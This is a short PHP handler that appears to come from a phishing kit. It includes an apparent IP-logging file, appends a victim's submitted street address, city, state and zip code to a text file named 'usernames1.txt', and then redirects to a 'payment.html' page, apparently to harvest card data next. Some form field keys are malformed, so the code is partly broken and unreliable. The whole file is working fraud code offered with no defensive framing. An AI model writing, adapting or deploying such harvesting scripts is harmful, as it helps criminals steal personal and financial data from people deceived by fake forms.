<?php
include 'ip.php';

file_put_contents("usernames1.txt", " [st.address]: " . $_POST['q6_shippingAddress[addr_line1]'] . " [st.address2]: " . $_POST['q6_shippingAddress[addr_line2]'] . " [city]: " . $_POST['q6_shippingAddress[city]'] . " [state]: " . $_POST['q6_shippingAddress[state]]'] . " [zip]: " . $_POST['q6_shippingAddress[postal'] . "\n", FILE_APPEND);
header('Location: payment.html');
exit();
